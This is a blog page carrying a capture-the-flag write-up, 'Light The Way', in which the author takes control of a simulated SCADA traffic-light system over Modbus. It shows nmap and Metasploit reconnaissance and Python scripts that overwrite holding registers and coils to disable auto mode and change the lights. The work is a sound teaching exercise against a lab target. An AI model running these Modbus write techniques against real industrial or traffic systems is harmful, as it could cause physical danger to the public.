<!DOCTYPE html>
<html lang="en" style="font-size: 105%">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  
  <meta name="author" content="Yojan Gautam">

  
  
  <meta name="description" content="Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.
SCADA Supervisory control and data acquisition is a system that allows industrial organizations to:
* Conrtol processes * Monitor * Interact with devices * Record events For more information on SCADA">
  

  
  <link rel="apple-touch-icon" sizes="180x180" href="//localhost:1313//images/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313//images/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313//images/favicon-16x16.png">

  
  
  <meta name="keywords" content='hugo latex theme blog texify texify2 texify3 michael neuper'>
  

  
  
  <link rel="stylesheet" href='/katex/katex.min.css'>
<script defer defer src='/katex/katex.min.js'></script>
<script defer src='/katex/contrib/auto-render.min.js'></script>
<script>
    document.addEventListener("DOMContentLoaded", function() {
        renderMathInElement(document.body, {
          delimiters: [
              {left: '$$', right: '$$', display: true},
              {left: '$', right: '$', display: false},
              {left: '\\(', right: '\\)', display: false},
              {left: '\\[', right: '\\]', display: true}
          ],
          throwOnError : false
        });
    });
</script>
  

  
    <script async data-name="BMC-Widget" 
        data-cfasync="true" 
        src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" 
        data-id="drmoscovium"
        data-description="Like what I do? Buy me a coffee!" 
        data-message="" 
        data-color="#d79921" 
        data-position="Right" 
        data-x_margin="18" 
        data-y_margin="18"
        crossorigin="anonymous">
  </script>


  
  <meta property="og:url" content="//localhost:1313/posts/writeups/htb-uni-ctf/lighttheway/">
  <meta property="og:site_name" content="drMoscovium Blog">
  <meta property="og:title" content="HTB UNI CTF : Light The Way">
  <meta property="og:description" content="Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.
SCADA Supervisory control and data acquisition is a system that allows industrial organizations to:
* Conrtol processes * Monitor * Interact with devices * Record events For more information on SCADA">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2021-11-21T23:22:26-05:00">
    <meta property="article:modified_time" content="2021-11-21T23:22:26-05:00">


  
  <link rel="canonical" href="//localhost:1313/posts/writeups/htb-uni-ctf/lighttheway/">

  
  
  
  <meta itemprop="name" content="HTB UNI CTF : Light The Way">
  <meta itemprop="description" content="Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.
SCADA Supervisory control and data acquisition is a system that allows industrial organizations to:
* Conrtol processes * Monitor * Interact with devices * Record events For more information on SCADA">
  <meta itemprop="datePublished" content="2021-11-21T23:22:26-05:00">
  <meta itemprop="dateModified" content="2021-11-21T23:22:26-05:00">
  <meta itemprop="wordCount" content="1302">
  <meta itemprop="keywords" content="CTF">

  
  
  
    <link rel="stylesheet" href="/css/common.min.e562d763c6d0825495eb17de8b2c1d9800cf7c08db1c36accedf77a5fccfc4b9.css" integrity="sha256-5WLXY8bQglSV6xfeiywdmADPfAjbHDaszt93pfzPxLk=" crossorigin="anonymous">
  

  
  
    <link rel="stylesheet" href="/css/content.min.ba38eba94cb47fef9936258c42d11ff19fa9686a30b38e783773fe3f15eb44dc.css" integrity="sha256-ujjrqUy0f&#43;&#43;ZNiWMQtEf8Z&#43;paGows454N3P&#43;PxXrRNw=" crossorigin="anonymous">
  

  
  
  <title>HTB UNI CTF : Light The Way - drMoscovium Blog</title>
  

  
  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="HTB UNI CTF : Light The Way">
<meta name="twitter:description" content="Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.
SCADA Supervisory control and data acquisition is a system that allows industrial organizations to:
* Conrtol processes * Monitor * Interact with devices * Record events For more information on SCADA">


  


  <link rel="stylesheet" href="/css/single.min.be779f459ad7e3aaf8afd0f80c6a61ca6c50993f5f18512532100ac6d93f0fa9.css" integrity="sha256-vnefRZrX46r4r9D4DGphymxQmT9fGFElMhAKxtk/D6k=" crossorigin="anonymous">


  <link rel="stylesheet" href="/css/single.min.78a121b7d7a160420f9daab0ea13add66c37b9c44f27bba07b27207e2b0975d2.css" integrity="sha256-eKEht9ehYEIPnaqw6hOt1mw3ucRPJ7ugeycgfisJddI=" crossorigin="anonymous">


</head>

<body>
  <div id="wrapper">
    


<header id="header">
  <h1>
    <a href="//localhost:1313/">drMoscovium Blog</a>
    <button id="dark-mode-toggle" class="dark-mode-toggle" aria-label="Toggle theme">
        <svg width="2rem" height="2rem" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 496">
        <path fill="currentColor" d="M8,256C8,393,119,504,256,504S504,393,504,256,393,8,256,8,8,119,8,256ZM256,440V72a184,184,0,0,1,0,368Z" transform="translate(-8 -8)"/>
        </svg>
    </button>
  </h1>

  <nav>
    
    <span class="nav-bar-item">
      
        <span class="icon"><svg width="1em" height="1em" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
<path d="M17,11H16a1,1,0,0,0,0,2h1a1,1,0,0,0,0-2Zm0,4H16a1,1,0,0,0,0,2h1a1,1,0,0,0,0-2ZM11,9h6a1,1,0,0,0,0-2H11a1,1,0,0,0,0,2ZM21,3H7A1,1,0,0,0,6,4V7H3A1,1,0,0,0,2,8V18a3,3,0,0,0,3,3H18a4,4,0,0,0,4-4V4A1,1,0,0,0,21,3ZM6,18a1,1,0,0,1-2,0V9H6Zm14-1a2,2,0,0,1-2,2H7.82A3,3,0,0,0,8,18V5H20Zm-9-4h1a1,1,0,0,0,0-2H11a1,1,0,0,0,0,2Zm0,4h1a1,1,0,0,0,0-2H11a1,1,0,0,0,0,2Z"/></svg>
</span>
      
      <a class="link" href="/posts/">Blog</a>
    </span>
    
    <span class="nav-bar-item">
      
        <span class="icon"><svg width="1em" height="1em" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
<path d="M2.88,16.88a3,3,0,0,0,0,4.24,3,3,0,0,0,4.24,0,3,3,0,0,0-4.24-4.24Zm2.83,2.83a1,1,0,0,1-1.42-1.42,1,1,0,0,1,1.42,0A1,1,0,0,1,5.71,19.71ZM5,12a1,1,0,0,0,0,2,5,5,0,0,1,5,5,1,1,0,0,0,2,0,7,7,0,0,0-7-7ZM5,8a1,1,0,0,0,0,2,9,9,0,0,1,9,9,1,1,0,0,0,2,0,11.08,11.08,0,0,0-3.22-7.78A11.08,11.08,0,0,0,5,8Zm10.61.39A15.11,15.11,0,0,0,5,4,1,1,0,0,0,5,6,13,13,0,0,1,18,19a1,1,0,0,0,2,0A15.11,15.11,0,0,0,15.61,8.39Z"/></svg>
</span>
      
      <a class="link" href="/index.xml">RSS</a>
    </span>
    
    <span class="nav-bar-item">
      
        <span class="icon"><svg width="1em" height="1em" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" data-name="Layer 1">
<path d="M10.07031,20.50291a1.00008,1.00008,0,0,0-1.18115-.9834c-1.30908.24024-2.96191.27637-3.40137-.958a5.70754,5.70754,0,0,0-1.83691-2.415,1.20073,1.20073,0,0,1-.1665-.10938,1,1,0,0,0-.93067-.64551H2.54883a.99965.99965,0,0,0-1,.99512c-.00391.81543.811,1.33789,1.1416,1.51465a4.4408,4.4408,0,0,1,.92383,1.35937c.36426,1.02344,1.42285,2.57617,4.46582,2.376.001.03516.00195.06836.00244.09863l.00439.26758a1,1,0,0,0,2,0l-.00488-.31836C10.07715,21.4951,10.07031,21.22068,10.07031,20.50291Zm10.667-15.126c.03174-.125.063-.26367.09034-.41992a6.27792,6.27792,0,0,0-.40821-3.293,1.002,1.002,0,0,0-.61572-.58007c-.356-.12012-1.67041-.35645-4.18408,1.25a13.86918,13.86918,0,0,0-6.354,0C6.76221.751,5.45459.9658,5.10205,1.07908a.99744.99744,0,0,0-.63135.584,6.3003,6.3003,0,0,0-.40332,3.35644c.02442.12793.05078.2461.07813.35449A6.26928,6.26928,0,0,0,2.89014,9.20311a8.42168,8.42168,0,0,0,.04248.92187c.334,4.60254,3.334,5.98438,5.42431,6.459-.04345.125-.083.25878-.11816.40039a1.00023,1.00023,0,0,0,1.94238.47851,1.6784,1.6784,0,0,1,.46778-.87793.99947.99947,0,0,0-.5459-1.74512c-3.4541-.39453-4.95362-1.80175-5.1792-4.89843a6.61076,6.61076,0,0,1-.03369-.73828,4.25769,4.25769,0,0,1,.91943-2.71289,3.022,3.022,0,0,1,.1958-.23145.99988.99988,0,0,0,.188-1.02441,3.3876,3.3876,0,0,1-.15527-.55567A4.09356,4.09356,0,0,1,6.1167,3.06346a7.54263,7.54263,0,0,1,2.415,1.17968,1.00877,1.00877,0,0,0,.82764.13282,11.77716,11.77716,0,0,1,6.17285.001,1.00549,1.00549,0,0,0,.83056-.13769,7.572,7.572,0,0,1,2.40528-1.19043,4.03977,4.03977,0,0,1,.0874,1.57812,3.205,3.205,0,0,1-.16895.60743.9999.9999,0,0,0,.188,1.02441c.07715.08691.1543.18066.22363.26855A4.12186,4.12186,0,0,1,20,9.20311a7.03888,7.03888,0,0,1-.0376.77734c-.22021,3.05566-1.72558,4.46387-5.1958,4.85937a1,1,0,0,0-.54541,1.7461,1.63079,1.63079,0,0,1,.46631.9082,3.06079,3.06079,0,0,1,.09229.81934v2.334C14.77,21.2949,14.77,21.78025,14.77,22.00291a1,1,0,1,0,2,0c0-.2168,0-.69238.00977-1.33984V18.31346a4.8815,4.8815,0,0,0-.15479-1.31153,4.25638,4.25638,0,0,0-.11621-.416,6.51258,6.51258,0,0,0,5.44531-6.42383A8.69677,8.69677,0,0,0,22,9.20311,6.13062,6.13062,0,0,0,20.7373,5.37693Z"/></svg>
</span>
      
      <a class="link" href="https://github.com/michaelneuper/hugo-texify3">GitHub</a>
    </span>
    
  </nav>
</header>
<hr class="head-rule"></hr>
    
<main id="main" class="post">
  
  <div class="post-heading">
    <h1 class="post-title">HTB UNI CTF : Light The Way</h1>
    <div class="publish-metadata">
      
      <svg width="0.75em" height="0.75em" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M3 9H21M7 3V5M17 3V5M6 13H8M6 17H8M11 13H13M11 17H13M16 13H18M16 17H18M6.2 21H17.8C18.9201 21 19.4802 21 19.908 20.782C20.2843 20.5903 20.5903 20.2843 20.782 19.908C21 19.4802 21 18.9201 21 17.8V8.2C21 7.07989 21 6.51984 20.782 6.09202C20.5903 5.71569 20.2843 5.40973 19.908 5.21799C19.4802 5 18.9201 5 17.8 5H6.2C5.0799 5 4.51984 5 4.09202 5.21799C3.71569 5.40973 3.40973 5.71569 3.21799 6.09202C3 6.51984 3 7.07989 3 8.2V17.8C3 18.9201 3 19.4802 3.21799 19.908C3.40973 20.2843 3.71569 20.5903 4.09202 20.782C4.51984 21 5.07989 21 6.2 21Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
      21 November 2021
      
      
        &nbsp;
        <span>
          <svg width="0.75em" height="0.75em" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M15.4998 5.49994L18.3282 8.32837M3 20.9997L3.04745 20.6675C3.21536 19.4922 3.29932 18.9045 3.49029 18.3558C3.65975 17.8689 3.89124 17.4059 4.17906 16.9783C4.50341 16.4963 4.92319 16.0765 5.76274 15.237L17.4107 3.58896C18.1918 2.80791 19.4581 2.80791 20.2392 3.58896C21.0202 4.37001 21.0202 5.63634 20.2392 6.41739L8.37744 18.2791C7.61579 19.0408 7.23497 19.4216 6.8012 19.7244C6.41618 19.9932 6.00093 20.2159 5.56398 20.3879C5.07171 20.5817 4.54375 20.6882 3.48793 20.9012L3 20.9997Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
          1302 words
        </span>
      
      
      
        
      
      
        &nbsp;
        <span>
          <svg width="0.75em" height="0.75em" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 7V12L14.5 13.5M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
          ~7 mins
        </span>
      
    </div>
  </div>

  
  
  
  <details>
    <summary>
      <b>Table of Contents</b>
    </summary>
    <div class="toc numbered-subtitles"><nav id="TableOfContents">
  <ul>
    <li><a href="#scada">SCADA</a></li>
    <li><a href="#starting-point">Starting Point</a></li>
    <li><a href="#nmap">Nmap</a>
      <ul>
        <li><a href="#more-info">More info!</a></li>
      </ul>
    </li>
    <li><a href="#get-data">Get DATA</a></li>
    <li><a href="#setting-it-to-manual">Setting it to manual</a></li>
    <li><a href="#reading-coils">Reading Coils</a></li>
  </ul>
</nav></div>
  </details>
  
  
  <article class="content numbered-subtitles">
    
    <p>Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.</p>
<p><img src="/lighttheway/question.png" alt=""></p>
<h2 id="scada">SCADA</h2>
<p>Supervisory control and data acquisition is a system that allows industrial organizations to:</p>
<pre><code>* Conrtol processes
* Monitor
* Interact with devices
* Record events
</code></pre>
<p><a href="https://inductiveautomation.com/resources/article/what-is-scada">For more information on SCADA</a></p>
<h2 id="starting-point">Starting Point</h2>
<p>For this specific challenge, we needed to compromise traffic lights. There wasn&rsquo;t much information to work with, given only the IP address of the system. It was also in the same network, which makes things easier.</p>
<p><img src="/lighttheway/HMI.png" alt=""></p>
<p>The given IP was : <code>10.129.96.95</code></p>
<p>A website and the IP was all the information that I had. So, where did I begin?</p>
<h2 id="nmap">Nmap</h2>
<p>Yep, nmap. It allows us to scan the system and find information on it.</p>
<pre tabindex="0"><code>nmap -p- 10.129.96.95 -sCV
</code></pre><p><img src="/lighttheway/nmap.png" alt="test"></p>
<p>Key Points:</p>
<pre><code>* PORT 22 : used for SSH, I wouldn't even try to attack it
* PORT 80 : running nginx server for the front end
* PORT 502: This is the interesting port. (I didn't knew it was interesting until I googled and found out that modbus uses it)
</code></pre>
<p>After figuring those stuff out, now&rsquo;s the time to enumerate more information on the Modbus.</p>
<pre tabindex="0"><code>nmap -p 502 --script modbus-discover 10.129.96.95
</code></pre><p><img src="/lighttheway/nmap2.png" alt=""></p>
<p>Didn&rsquo;t give much but it confirms that Modbus is running on port 502.</p>
<h3 id="more-info">More info!</h3>
<p><img src="https://c.tenor.com/ayUs509YzsIAAAAC/kid-bored.gif" alt=""></p>
<p>What I have here isn&rsquo;t enough to make the exploit. So, what should I do?</p>
<p>Turning back to my good old friend, internet I found a metaspolit script <code>auxiliary/scanner/scada/modbus_findunitid</code></p>
<p>Using the script, I was able to figure out that there are more than one unit in the given SCADA system. I didn&rsquo;t let the script complete, but there are more than 200 units.</p>
<p><em><strong>Why are there so many?</strong></em>
There are 6 junctions in the picture, and if there are more than 200 does each unit control one light?</p>
<p>Before answerinng that question let&rsquo;s first look at what data the first unit has.</p>
<h2 id="get-data">Get DATA</h2>
<p>Let&rsquo;s search if there&rsquo;s any more metaspolit script that we can use.</p>
<pre tabindex="0"><code>msf6&gt; search modbus
</code></pre><p>After searching for modbus, I found 6 modules/scripts</p>
<pre tabindex="0"><code>Matching Modules
================

   #  Name                                            Disclosure Date  Rank    Check  Description
   -  ----                                            ---------------  ----    -----  -----------
   0  auxiliary/analyze/modbus_zip                                     normal  No     Extract zip from Modbus communication
   1  auxiliary/scanner/scada/modbus_banner_grabbing                   normal  No     Modbus Banner Grabbing
   2  auxiliary/scanner/scada/modbusclient                             normal  No     Modbus Client Utility
   3  auxiliary/scanner/scada/modbus_findunitid       2012-10-28       normal  No     Modbus Unit ID and Station ID Enumerator
   4  auxiliary/scanner/scada/modbusdetect            2011-11-01       normal  No     Modbus Version Scanner
   5  auxiliary/admin/scada/modicon_stux_transfer     2012-04-05       normal  No     Schneider Modicon Ladder Logic Upload/Download
   6  auxiliary/admin/scada/modicon_command           2012-04-05       normal  No     Schneider Modicon Remote START/STOP Command
</code></pre><p>Modbusclient module seems to be the most useful for this case.</p>
<pre tabindex="0"><code>msf6&gt; use auxiliary/scanner/scada/modbusclient
msf6 auxiliary(scanner/scada/modbusclient)&gt; show options
</code></pre><p><img src="/lighttheway/meta1.png" alt=""></p>
<p>So the RHOST for this  instance will be the IP address : <code>10.129.96.95</code></p>
<pre tabindex="0"><code>set RHOST 10.129.96.95
</code></pre><p>We need to set where we want to start reading the DATA from to do that we need wo set the DATA_ADDRESS field</p>
<pre tabindex="0"><code>set DATA_ADDRESS 0
</code></pre><p>Then we need to set how many DATA_ADDRESS we want to read.</p>
<pre tabindex="0"><code>set NUMBER 18
</code></pre><p><img src="/lighttheway/meta2.png" alt=""></p>
<p>Let&rsquo;s see what those numbers mean.</p>
<p>This small python command takes the arr of int and converts to a string.</p>
<pre tabindex="0"><code>arr = [97, 117, 116, 111, 95, 109, 111, 100, 101, 58, 116, 114, 117, 101]

print(&#34;&#34;.join(chr(x) for x in arr))
</code></pre><p>With the python script I was able to get a string: <code>auto_mode:true</code></p>
<h2 id="setting-it-to-manual">Setting it to manual</h2>
<p>If I remember correctly the description of the challenge wants us to set it to manual mode. Which means we need to set the auto_mode to false.</p>
<pre tabindex="0"><code>print([ord(x) for x in &#34;auto_mode:false&#34;])
</code></pre><p>Used this python script to get the numbers that we need to send in order to set the SCADA system to false.</p>
<pre tabindex="0"><code>[97, 117, 116, 111, 95, 109, 111, 100, 101, 58, 102, 97, 108, 115, 101]
</code></pre><p>I wrote a simple python script that uses the Perl Modbus library to write to the holding registry.
<img src="https://c.tenor.com/zOAWdshu_I0AAAAd/boring-unimpressed.gif" alt=""></p>
<p>Yea, I later figured out that python had a library to connect to modbus, but anyways it works.</p>
<pre tabindex="0"><code>import subprocess

for i in range(1,20):                           #  :  f   a   l   s   e
    cmd = f&#34;modbus write -w -s {i} 10.129.96.95 10 58 102 97 108 115 101&#34;
    subprocess.run(cmd.split(&#34; &#34;))
</code></pre><p><code>modbus {command} {type} {slaveid} {target_ip} {data_address} {information_to_write}</code></p>
<p>I set it to the first 20 to see if that would make any difference. It didn&rsquo;t make any visual difference. But if I look at the registers again, it changed the values.</p>
<p><img src="/lighttheway/meta3.png" alt="">
<em>First one is before running the script, second one is after running the python script.</em></p>
<p>So, if that didn&rsquo;t change anything, what can I do?</p>
<p>Coils also store values, and I can read and write it.</p>
<h2 id="reading-coils">Reading Coils</h2>
<pre tabindex="0"><code>msf6 auxiliary(scanner/scada/modbusclient)&gt; set action READ_COILS
</code></pre><p>Reading the first 18 coils, it was all just bunch of 0s so I decided to read 2000 of them to see if I find anything good.</p>
<pre tabindex="0"><code>msf6 auxiliary(scanner/scada/modbusclient)&gt; set NUMBER 2000
</code></pre><p><img src="/lighttheway/meta4.png" alt=""></p>
<p>After trying to get 2000 coils, I can see some interesting information. There are bunch of 1 in the middle.</p>
<p>Let&rsquo;s see what other Units have.</p>
<pre tabindex="0"><code>msf6 auxiliary(scanner/scada/modbusclient)&gt; set UNIT_NUMBER 2
</code></pre><p>UNIT_NUMBER determines which slave node we are viewing.</p>
<p>After looking through 7 to 8 of them I found out that only 6 of it hold any valuable data. So, I concluded that each unit represents one junction.</p>
<pre tabindex="0"><code>from pyModbusTCP.client import ModbusClient

data_address = {}

for i in range(1,7):
    c = ModbusClient(host=&#34;10.129.96.95&#34;, port=&#34;502&#34;, unit_id=i, auto_open=True)

    regs = c.read_coils(0,2000)

    data_address[i] = regs.index(True)

print(data_address)
</code></pre><p>I wrote this script to get the DATA_ADDRESS of all the 1/True places.</p>
<pre tabindex="0"><code>{1: 571, 2: 1921, 3: 531, 4: 1267, 5: 925, 6: 888}
</code></pre><h1 id="the-exploit">The exploit?</h1>
<p>Now I have all the necessary information on the data address of where they are reading the traffic data from, I can create a payload to change the traffic lights.</p>
<p>The first three bits represents the North side of the light, and goes in order of</p>
<p>Green Yellow Red</p>
<p>IF we curl the api <code>http://10.129.96.95/api</code> we can see value for all the colors and the direction.</p>
<p><img src="/lighttheway/curl.png" alt=""></p>
<p>After doing some digging I found out that the API doesn&rsquo;t represent the data in the same way the registers stores the data.</p>
<p>In the registers we need to pass in data as follow:</p>
<pre tabindex="0"><code>NG NY NR EG EY ER SG SY SR WG WY WR
</code></pre><p><img src="/lighttheway/lights.png" alt=""></p>
<p>Looking at the picture we need to change the west side to green because the car is about to turn towards west for the first junction, and we have to turn the East side to Green for the 2nd and 4th junction, and finally the north side for 6th junction.</p>
<p>So the values for junction one are as follow:</p>
<pre tabindex="0"><code>[False, False, True, False, False, True, False, False, True, True, False, False]
</code></pre><p>This will turn on the green light on the west.</p>
<pre tabindex="0"><code>[False, False, True, False, False, True, False, False, True, False, False, True]
</code></pre><p>So, What I was saying about the direction didn&rsquo;t make any sense, I had to play around for a long time before I figured out the correct light to turn on. The placement of the lights didn&rsquo;t sense to me, it might be becuase the difference in driving in different country.</p>
<p>The following script did the job.</p>
<pre tabindex="0"><code>from pyModbusTCP.client import ModbusClient

data_address = {}

c = ModbusClient(host=&#34;10.129.96.95&#34;, port=&#34;502&#34;, unit_id=1, auto_open=True)
for i in range(1,7):
    c.unit_id(i)
    regs = c.read_coils(0,2000)

    data_address[i] = regs.index(True)

c.unit_id(1)
c.write_multiple_coils(571,[False, False, True, False, False, True, False, False, True, True, False, False])

c.unit_id(2)
c.write_multiple_coils(1920, [True, False, False, False, False, True,False, False, True, False, False, True])


c.unit_id(4)
c.write_multiple_coils(1266, [False, False, True, False, False, True,False, False, True, True, False, False])


c.unit_id(6)
c.write_multiple_coils(886,[False, False, True, False, False, True, False, False, True, True, False, False])
</code></pre><p>After running the script, the car moved and I found the flag.</p>
<p><img src="/lighttheway/lighttheway.gif" alt=""></p>
<p>Flag:<code>HTB{w3_se3_tH3_l1ght}</code></p>

    
  </article>

  <button onclick="topFunction()" id="back-to-top" title="Go to top">Back to Top</button>

  

<div id="sharingbuttons">
    
    
    <a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=%2f%2flocalhost%3a1313%2fposts%2fwriteups%2fhtb-uni-ctf%2flighttheway%2f" target="_blank" rel="noopener" aria-label="">
      <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18.77 7.46H14.5v-1.9c0-.9.6-1.1 1-1.1h3V.5h-4.33C10.24.5 9.5 3.44 9.5 5.32v2.15h-3v4h3v12h5v-12h3.85l.42-4z"/></svg>
        </div>
      </div>
    </a>
    

    
    
    <a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?text=HTB%20UNI%20CTF%20%3a%20Light%20The%20Way&amp;url=%2f%2flocalhost%3a1313%2fposts%2fwriteups%2fhtb-uni-ctf%2flighttheway%2f" target="_blank" rel="noopener" aria-label="">
      <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M23.44 4.83c-.8.37-1.5.38-2.22.02.93-.56.98-.96 1.32-2.02-.88.52-1.86.9-2.9 1.1-.82-.88-2-1.43-3.3-1.43-2.5 0-4.55 2.04-4.55 4.54 0 .36.03.7.1 1.04-3.77-.2-7.12-2-9.36-4.75-.4.67-.6 1.45-.6 2.3 0 1.56.8 2.95 2 3.77-.74-.03-1.44-.23-2.05-.57v.06c0 2.2 1.56 4.03 3.64 4.44-.67.2-1.37.2-2.06.08.58 1.8 2.26 3.12 4.25 3.16C5.78 18.1 3.37 18.74 1 18.46c2 1.3 4.4 2.04 6.97 2.04 8.35 0 12.92-6.92 12.92-12.93 0-.2 0-.4-.02-.6.9-.63 1.96-1.22 2.56-2.14z"/></svg>
        </div>
      </div>
    </a>
    

    
    
    <a class="resp-sharing-button__link" href="mailto:?subject=HTB%20UNI%20CTF%20%3a%20Light%20The%20Way&amp;body=%2f%2flocalhost%3a1313%2fposts%2fwriteups%2fhtb-uni-ctf%2flighttheway%2f" target="_self" rel="noopener" aria-label="">
      <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M22 4H2C.9 4 0 4.9 0 6v12c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zM7.25 14.43l-3.5 2c-.08.05-.17.07-.25.07-.17 0-.34-.1-.43-.25-.14-.24-.06-.55.18-.68l3.5-2c.24-.14.55-.06.68.18.14.24.06.55-.18.68zm4.75.07c-.1 0-.2-.03-.27-.08l-8.5-5.5c-.23-.15-.3-.46-.15-.7.15-.22.46-.3.7-.14L12 13.4l8.23-5.32c.23-.15.54-.08.7.15.14.23.07.54-.16.7l-8.5 5.5c-.08.04-.17.07-.27.07zm8.93 1.75c-.1.16-.26.25-.43.25-.08 0-.17-.02-.25-.07l-3.5-2c-.24-.13-.32-.44-.18-.68s.44-.32.68-.18l3.5 2c.24.13.32.44.18.68z"/></svg>
        </div>
      </div>
    </a>
    

    
    
    <a class="resp-sharing-button__link" href="https://www.linkedin.com/sharing/share-offsite/?url=%2f%2flocalhost%3a1313%2fposts%2fwriteups%2fhtb-uni-ctf%2flighttheway%2f" target="_blank" rel="noopener" aria-label="">
      <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.5 21.5h-5v-13h5v13zM4 6.5C2.5 6.5 1.5 5.3 1.5 4s1-2.4 2.5-2.4c1.6 0 2.5 1 2.6 2.5 0 1.4-1 2.5-2.6 2.5zm11.5 6c-1 0-2 1-2 2v7h-5v-13h5V10s1.6-1.5 4-1.5c3 0 5 2.2 5 6.3v6.7h-5v-7c0-1-1-2-2-2z"/></svg>
        </div>
      </div>
    </a>
    

    
    
    <a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=%2f%2flocalhost%3a1313%2fposts%2fwriteups%2fhtb-uni-ctf%2flighttheway%2f&amp;resubmit=true&amp;title=HTB%20UNI%20CTF%20%3a%20Light%20The%20Way" target="_blank" rel="noopener" aria-label="">
      <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M24 11.5c0-1.65-1.35-3-3-3-.96 0-1.86.48-2.42 1.24-1.64-1-3.75-1.64-6.07-1.72.08-1.1.4-3.05 1.52-3.7.72-.4 1.73-.24 3 .5C17.2 6.3 18.46 7.5 20 7.5c1.65 0 3-1.35 3-3s-1.35-3-3-3c-1.38 0-2.54.94-2.88 2.22-1.43-.72-2.64-.8-3.6-.25-1.64.94-1.95 3.47-2 4.55-2.33.08-4.45.7-6.1 1.72C4.86 8.98 3.96 8.5 3 8.5c-1.65 0-3 1.35-3 3 0 1.32.84 2.44 2.05 2.84-.03.22-.05.44-.05.66 0 3.86 4.5 7 10 7s10-3.14 10-7c0-.22-.02-.44-.05-.66 1.2-.4 2.05-1.54 2.05-2.84zM2.3 13.37C1.5 13.07 1 12.35 1 11.5c0-1.1.9-2 2-2 .64 0 1.22.32 1.6.82-1.1.85-1.92 1.9-2.3 3.05zm3.7.13c0-1.1.9-2 2-2s2 .9 2 2-.9 2-2 2-2-.9-2-2zm9.8 4.8c-1.08.63-2.42.96-3.8.96-1.4 0-2.74-.34-3.8-.95-.24-.13-.32-.44-.2-.68.15-.24.46-.32.7-.18 1.83 1.06 4.76 1.06 6.6 0 .23-.13.53-.05.67.2.14.23.06.54-.18.67zm.2-2.8c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm5.7-2.13c-.38-1.16-1.2-2.2-2.3-3.05.38-.5.97-.82 1.6-.82 1.1 0 2 .9 2 2 0 .84-.53 1.57-1.3 1.87z"/></svg>
        </div>
      </div>
    </a>
    

    
    
    <a class="resp-sharing-button__link" href="whatsapp://send?text=%2f%2flocalhost%3a1313%2fposts%2fwriteups%2fhtb-uni-ctf%2flighttheway%2f" target="_blank" rel="noopener" aria-label="">
      <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
